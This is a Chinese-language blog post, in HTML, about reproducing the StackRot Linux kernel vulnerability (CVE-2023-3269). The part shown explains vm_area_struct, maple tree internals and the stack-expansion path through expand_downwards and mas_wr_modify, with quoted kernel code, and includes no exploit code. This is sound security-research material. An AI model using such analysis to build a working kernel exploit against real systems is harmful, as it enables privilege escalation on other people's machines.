

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
  <link rel="icon" href="/img/favicon/icon.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Eurus">
  <meta name="keywords" content="">
  
    <meta name="description" content="接上文，Eurus复现了StackRot( •̀ ω •́ )✧">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2023-3269 StackRot">
<meta property="og:url" content="http://akaieurus.github.io/2026/02/28/cve-2023-3269/index.html">
<meta property="og:site_name" content="Eurus禁止摆烂！">
<meta property="og:description" content="接上文，Eurus复现了StackRot( •̀ ω •́ )✧">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://akaieurus.github.io/img/posts/20233269.png">
<meta property="article:published_time" content="2026-02-27T19:46:41.000Z">
<meta property="article:modified_time" content="2026-02-28T15:22:13.033Z">
<meta property="article:author" content="Eurus">
<meta property="article:tag" content="kernel">
<meta property="article:tag" content="cve">
<meta property="article:tag" content="rcu">
<meta property="article:tag" content="race condition">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/20233269.png">
  
  
  
  <title>CVE-2023-3269 StackRot - Eurus禁止摆烂！</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 100vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Eurus&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/posts/20233269.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CVE-2023-3269 StackRot"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2026-02-28 03:46" pubdate>
          2026年2月28日 凌晨
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          6.6k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          56 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
        <div class="scroll-down-bar">
          <i class="iconfont icon-arrowdown"></i>
        </div>
      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">CVE-2023-3269 StackRot</h1>
            
            
              <div class="markdown-body">
                
                <p>接上文，Eurus复现了StackRot( •̀ ω •́ )✧</p>
<span id="more"></span>

<h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><h2 id="vma-amp-maple-tree"><a href="#vma-amp-maple-tree" class="headerlink" title="vma &amp; maple tree"></a>vma &amp; maple tree</h2><p>一块虚拟内存区域用一个vm_area_struct表示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> &#123;</span><br>	<span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>          vm_start;             <span class="hljs-comment">/*     0     8 */</span><br>	<span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>          vm_end;               <span class="hljs-comment">/*     8     8 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *         <span class="hljs-title">vm_mm</span>;</span>                <span class="hljs-comment">/*    16     8 */</span><br>	<span class="hljs-type">pgprot_t</span>                   vm_page_prot;         <span class="hljs-comment">/*    24     8 */</span><br>	<span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>          vm_flags;             <span class="hljs-comment">/*    32     8 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rb_node</span> <span class="hljs-title">rb</span> __<span class="hljs-title">attribute__</span>((__<span class="hljs-title">aligned__</span>(8)));</span> <span class="hljs-comment">/*    40    24 */</span><br>			<span class="hljs-comment">/* --- cacheline 1 boundary (64 bytes) --- */</span><br>			<span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> rb_subtree_last; <span class="hljs-comment">/*    64     8 */</span><br>		&#125; __attribute__((__aligned__(<span class="hljs-number">8</span>))) shared __attribute__((__aligned__(<span class="hljs-number">8</span>))); <span class="hljs-comment">/*    40    32 */</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anon_vma_name</span> * <span class="hljs-title">anon_name</span>;</span>        <span class="hljs-comment">/*    40     8 */</span><br>	&#125; __attribute__((__aligned__(<span class="hljs-number">8</span>)));               <span class="hljs-comment">/*    40    32 */</span><br>	<span class="hljs-comment">/* --- cacheline 1 boundary (64 bytes) was 8 bytes ago --- */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span>           <span class="hljs-title">anon_vma_chain</span>;</span>       <span class="hljs-comment">/*    72    16 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anon_vma</span> *          <span class="hljs-title">anon_vma</span>;</span>             <span class="hljs-comment">/*    88     8 */</span><br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_operations_struct</span>  * <span class="hljs-title">vm_ops</span>;</span>     <span class="hljs-comment">/*    96     8 */</span><br>	<span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>          vm_pgoff;             <span class="hljs-comment">/*   104     8 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *              <span class="hljs-title">vm_file</span>;</span>              <span class="hljs-comment">/*   112     8 */</span><br>	<span class="hljs-type">void</span> *                     vm_private_data;      <span class="hljs-comment">/*   120     8 */</span><br>	<span class="hljs-comment">/* --- cacheline 2 boundary (128 bytes) --- */</span><br>	<span class="hljs-type">atomic_long_t</span>              swap_readahead_info;  <span class="hljs-comment">/*   128     8 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mempolicy</span> *         <span class="hljs-title">vm_policy</span>;</span>            <span class="hljs-comment">/*   136     8 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_userfaultfd_ctx</span>  <span class="hljs-title">vm_userfaultfd_ctx</span>;</span>   <span class="hljs-comment">/*   144     0 */</span><br><br>	<span class="hljs-comment">/* size: 144, cachelines: 3, members: 15 */</span><br>	<span class="hljs-comment">/* forced alignments: 1 */</span><br>	<span class="hljs-comment">/* last cacheline: 16 bytes */</span><br>&#125; __attribute__((__aligned__(<span class="hljs-number">8</span>)));<br></code></pre></td></tr></table></figure>

<p>在最开始的设计，vm_area_struct是用rb tree（红黑树）存储的；这个patch series<sup>[10]</sup>引入了maple tree（一种B树）存储vm_area_struct</p>
<p>maple_node结点有不同的形式，以下以maple_range_64为例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">maple_range_64</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">maple_pnode</span> *       <span class="hljs-title">parent</span>;</span>               <span class="hljs-comment">/*     0     8 */</span><br>	<span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>          pivot[<span class="hljs-number">15</span>];            <span class="hljs-comment">/*     8   120 */</span><br>	<span class="hljs-comment">/* --- cacheline 2 boundary (128 bytes) --- */</span><br>	<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>		<span class="hljs-type">void</span> *             slot[<span class="hljs-number">16</span>];             <span class="hljs-comment">/*   128   128 */</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>			<span class="hljs-type">void</span> *     pad[<span class="hljs-number">15</span>];              <span class="hljs-comment">/*   128   120 */</span><br>			<span class="hljs-comment">/* --- cacheline 3 boundary (192 bytes) was 56 bytes ago --- */</span><br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">maple_metadata</span> <span class="hljs-title">meta</span>;</span>      <span class="hljs-comment">/*   248     2 */</span><br>		&#125;;                                       <span class="hljs-comment">/*   128   128 */</span><br>	&#125;;                                               <span class="hljs-comment">/*   128   128 */</span><br><br>	<span class="hljs-comment">/* size: 256, cachelines: 4, members: 3 */</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>主要注意两个成员：</p>
<ul>
<li>pivot数组：用于存储枢轴，即内存区域的端点</li>
<li>slot数组：用于存储下一个maple node的指针或者指向vm_area_struct的指针</li>
</ul>
<p>一棵存储vm_are_struct的maple tree如图所示，<em>最下面一层的maple node slot中的指针都是指向vm_area_struct的</em>：</p>
<img src="/2026/02/28/cve-2023-3269/maple_tree.png" srcset="/img/loading.gif" lazyload class title="maple_tree">

<p>每个进程的mm_struct存储了本进程的maple_tree</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">maple_tree</span>  <span class="hljs-title">mm_mt</span>;</span>                <span class="hljs-comment">/*     0    24 */</span><br><br>		<span class="hljs-comment">/* ... */</span><br><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rw_semaphore</span> <span class="hljs-title">mmap_lock</span>;</span>           <span class="hljs-comment">/*   112    40 */</span><br>	&#125;;                                               <span class="hljs-comment">/*     0   992 */</span><br>	<span class="hljs-comment">/* ... */</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p><em>注意一下这个mmap_lock，之后会讲到:)</em></p>
<h2 id="栈扩展"><a href="#栈扩展" class="headerlink" title="栈扩展"></a>栈扩展</h2><p>在调用do_user_addr_fault处理页错误的时候存在一种情况用于栈扩展</p>
<ul>
<li><p>调用find_vma，查找包含给定address的vma或者下一个vma，<em>比如0x7fbc3ca9bff8导致页错误会返回vma 0xffff888004c92510</em></p>
<img src="/2026/02/28/cve-2023-3269/maple_tree.png" srcset="/img/loading.gif" lazyload class title="maple_tree">
</li>
<li><p>如果取到的vma有VM_GROWSDOWN标志，那么会调用expand_stack进行栈拓展</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">vma = find_vma(mm, address);<br><span class="hljs-keyword">if</span> (unlikely(!vma)) &#123;<br>    bad_area(regs, error_code, address);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (likely(vma-&gt;vm_start &lt;= address))<br>    <span class="hljs-keyword">goto</span> good_area;<br><span class="hljs-keyword">if</span> (unlikely(!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))) &#123;<br>    bad_area(regs, error_code, address);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (unlikely(expand_stack(vma, address))) &#123;<br>    bad_area(regs, error_code, address);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>expand_stack会直接调到expand_downwards</p>
<h3 id="expand-downards"><a href="#expand-downards" class="headerlink" title="expand_downards"></a>expand_downards</h3><p>接上文，如果是栈扩展导致的页错误，查找到的vma应该是下一个vma（即栈vma），expand_downwards会先调用mas_prev查找前一个vma，以下这段代码判定两个情况：</p>
<ul>
<li>前一个vma没有VM_GROWSDOWN标志（即不是栈vma），那么栈和前一块内存区域需要存在一段stack_guard_gap</li>
<li>前一个vma有VM_GROWSDOWN标志，则不要求存在stack_guard_gap</li>
</ul>
<p><em>这段代码暂时不太重要，但和漏洞关系很大，为了讲述顺序提一下</em></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">expand_downwards</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address)</span><br>&#123;<br>	<span class="hljs-comment">/* ... */</span><br><br>	<span class="hljs-comment">/* Enforce stack_guard_gap */</span><br>	prev = mas_prev(&amp;mas, <span class="hljs-number">0</span>);<br>	<span class="hljs-comment">/* Check that both stack segments have the same anon_vma? */</span><br>	<span class="hljs-keyword">if</span> (prev &amp;&amp; !(prev-&gt;vm_flags &amp; VM_GROWSDOWN) &amp;&amp;<br>			vma_is_accessible(prev)) &#123;<br>		<span class="hljs-keyword">if</span> (address - prev-&gt;vm_end &lt; stack_guard_gap)<br>			<span class="hljs-keyword">return</span> -ENOMEM;<br>	&#125;<br>    <br>    <span class="hljs-comment">/* ... */</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>之后expand_downwards以以下调用链更改vma maple tree进行栈拓展，其中从vma_mas_store到mas_wr_store_entry的调用（主要是mas_wr_store_entry）是在定位需要更改的maple node，在mas_wr_modify中进行更改</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">expand_downwards<br>    -&gt; vma_mas_store<br>    -&gt; mas_store_prealloc<br>    -&gt; mas_wr_store_entry<br>    -&gt; mas_wr_modify<br></code></pre></td></tr></table></figure>

<p>定位主要依靠两个数据结构，ma_state和ma_wr_state</p>
<ul>
<li>ma_state<ul>
<li>tree：正在更改的maple tree</li>
<li>node：正在更改的maple node</li>
<li>index &amp; last：在当前语境下，表示需要插入的内存区间，<em>以下图为例，访问0x7fbc3ca9bff8导致页错误，要将vma 0xffff888004c92510向下拓展一页</em></li>
<li>min &amp; max：当前正在访问的maple node表示的内存区间，<em>图示maple node是[0x7cafff, 0xffffffffffffffff]，就是堆以上的部分</em></li>
<li>offset：相当于一个“光标”，表示当前结点正在更改的slot &#x2F; pivot index</li>
</ul>
</li>
<li>ma_wr_state<ul>
<li>mas：协同工作的ma_state</li>
<li>r_min &amp; r_max：需要更改的结点的区间，<em>以下图为例就是栈区间</em></li>
<li>offset_end：需要更改的最后一个slot &#x2F; pivot index</li>
<li>node_end：本结点最后一个有效的slot &#x2F; pivot index</li>
<li>pivots：本结点的pivot数组</li>
<li>slots：本结点的slot数组</li>
<li>entry：需要写入maple tree的vm_area_struct</li>
<li>content：要被覆盖的vm_area_struct指针</li>
</ul>
</li>
</ul>
<p><strong>ma_state vs ma_wr_state</strong>：</p>
<ul>
<li>ma_state：状态跟踪器，记录了更改模板（index &amp; last），当前结点状态（min &amp; max，offset）</li>
<li>ma_wr_state：写操作工作台，记录写操作影响的区间（min &amp; max），写操作需要更改的最后一个pivot &#x2F; slot（offset_end）</li>
</ul>
<img src="/2026/02/28/cve-2023-3269/mas.png" srcset="/img/loading.gif" lazyload class title="mas">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ma_state</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">maple_tree</span> *<span class="hljs-title">tree</span>;</span>	<span class="hljs-comment">/* The tree we&#x27;re operating in */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> index;		<span class="hljs-comment">/* The index we&#x27;re operating on - range start */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> last;		<span class="hljs-comment">/* The last index we&#x27;re operating on - range end */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">maple_enode</span> *<span class="hljs-title">node</span>;</span>	<span class="hljs-comment">/* The node containing this entry */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> min;		<span class="hljs-comment">/* The minimum index of this node - implied pivot min */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> max;		<span class="hljs-comment">/* The maximum index of this node - implied pivot max */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">maple_alloc</span> *<span class="hljs-title">alloc</span>;</span>	<span class="hljs-comment">/* Allocated nodes for this operation */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> depth;		<span class="hljs-comment">/* depth of tree descent during write */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> offset;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> mas_flags;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ma_wr_state</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ma_state</span> *<span class="hljs-title">mas</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">maple_node</span> *<span class="hljs-title">node</span>;</span>	<span class="hljs-comment">/* Decoded mas-&gt;node */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r_min;		<span class="hljs-comment">/* range min */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r_max;		<span class="hljs-comment">/* range max */</span><br>	<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">maple_type</span> <span class="hljs-title">type</span>;</span>		<span class="hljs-comment">/* mas-&gt;node type */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> offset_end;	<span class="hljs-comment">/* The offset where the write ends */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> node_end;		<span class="hljs-comment">/* mas-&gt;node end */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *pivots;		<span class="hljs-comment">/* mas-&gt;node-&gt;pivots pointer */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end_piv;		<span class="hljs-comment">/* The pivot at the offset end */</span><br>	<span class="hljs-type">void</span> __rcu **slots;		<span class="hljs-comment">/* mas-&gt;node-&gt;slots pointer */</span><br>	<span class="hljs-type">void</span> *entry;			<span class="hljs-comment">/* The entry to write */</span><br>	<span class="hljs-type">void</span> *content;			<span class="hljs-comment">/* The existing entry that is being overwritten */</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>设定ma_state和ma_wr_state查找定位需要更改的maple node流程如下：</p>
<ul>
<li><p>从maple tree的根节点开始walk（mas_wr_walk），查找一个包含ma_state-&gt;index的区间，并设定ma_wr_state</p>
</li>
<li><p>在walk更改ma_wr_state的过程中，由于更新ma_state的mas_wr_walk_traverse函数永远少一步，所以最后一个更新的min &amp; max是父结点区间，相当于当前整个结点的区间</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">mas_wr_walk</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ma_wr_state *wr_mas)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ma_state</span> *<span class="hljs-title">mas</span> =</span> wr_mas-&gt;mas;<br><br>	<span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>		mas_wr_walk_descend(wr_mas); <span class="hljs-comment">// go to next maple node</span><br>		<span class="hljs-keyword">if</span> (unlikely(mas_is_span_wr(wr_mas)))<br>			<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>		wr_mas-&gt;content = mas_slot_locked(mas, wr_mas-&gt;slots,<br>						  mas-&gt;offset);<br>		<span class="hljs-keyword">if</span> (ma_is_leaf(wr_mas-&gt;type)) <span class="hljs-comment">// HIT! RETURN</span><br>			<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>		mas_wr_walk_traverse(wr_mas); <span class="hljs-comment">// update ma_state</span><br>	&#125;<br><br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">mas_wr_walk_traverse</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ma_wr_state *wr_mas)</span><br>&#123;<br>	wr_mas-&gt;mas-&gt;max = wr_mas-&gt;r_max;<br>	wr_mas-&gt;mas-&gt;min = wr_mas-&gt;r_min;<br>	wr_mas-&gt;mas-&gt;node = wr_mas-&gt;content;<br>	wr_mas-&gt;mas-&gt;offset = <span class="hljs-number">0</span>;<br>	wr_mas-&gt;mas-&gt;depth++;<br>&#125;<br></code></pre></td></tr></table></figure></li>
</ul>
<h3 id="mas-wr-modify"><a href="#mas-wr-modify" class="headerlink" title="mas_wr_modify"></a>mas_wr_modify</h3><p>在拓展栈的情形下，根据之前讨论的前一个区间是否为栈区间分两种情况：</p>
<ul>
<li><p>S1：前一个区间不是栈区间，那么只需要调整pivot就行，slot的数量没变</p>
<img src="/2026/02/28/cve-2023-3269/modify-stack1.png" srcset="/img/loading.gif" lazyload class title="modify-stack1">
</li>
<li><p>S2：前一个区间如果是栈区间，那么访问导致页错误的那个gap区间和后方的栈区间需要合并，slot少了一个</p>
<img src="/2026/02/28/cve-2023-3269/modify-stack2.png" srcset="/img/loading.gif" lazyload class title="modify-stack2"></li>
</ul>
